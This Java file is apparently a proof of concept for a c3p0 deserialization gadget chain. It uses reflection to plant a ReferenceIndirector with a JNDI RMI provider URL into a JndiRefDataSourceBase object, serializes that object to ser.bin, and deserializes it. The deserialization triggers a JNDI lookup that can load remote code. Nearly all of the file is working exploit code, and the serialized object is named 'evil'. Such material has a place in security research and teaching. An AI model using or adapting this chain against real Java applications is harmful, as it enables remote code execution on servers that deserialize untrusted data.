package C3P0;

import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;
import com.mchange.v2.ser.Indirector;
import com.mchange.v2.ser.SerializableUtils;

import javax.naming.Name;
import javax.naming.Reference;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class c3p0_jndi_readobject {
    public static void main(String[] args) throws Exception {
        Reference ref = new Reference(null);

        Hashtable env = new Hashtable();
        env.put("java.naming.factory.initial","com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put("java.naming.provider.url","rmi://127.0.0.1:1099/pysnow");

        Constructor<?> refconz = ReferenceIndirector.class.getDeclaredClasses()[0].getDeclaredConstructors()[0];
        refconz.setAccessible(true);
        Object refser = refconz.newInstance(ref, null, null, env);


        JndiRefDataSourceBase jndiref = new JndiRefDataSourceBase(false);
        setField(jndiref, "jndiName", refser);

        writeObject(jndiref);
        readObject("ser.bin");
    }

    public static void setField(Object obj, String fieldName, Object newValue) {
        try {
            Class<?> clazz = obj.getClass();
            Field field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, newValue);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public static void writeObject(Object evil) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"))) {
            oos.writeObject(evil);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object readObject(String filename) {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            return ois.readObject();
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }
}
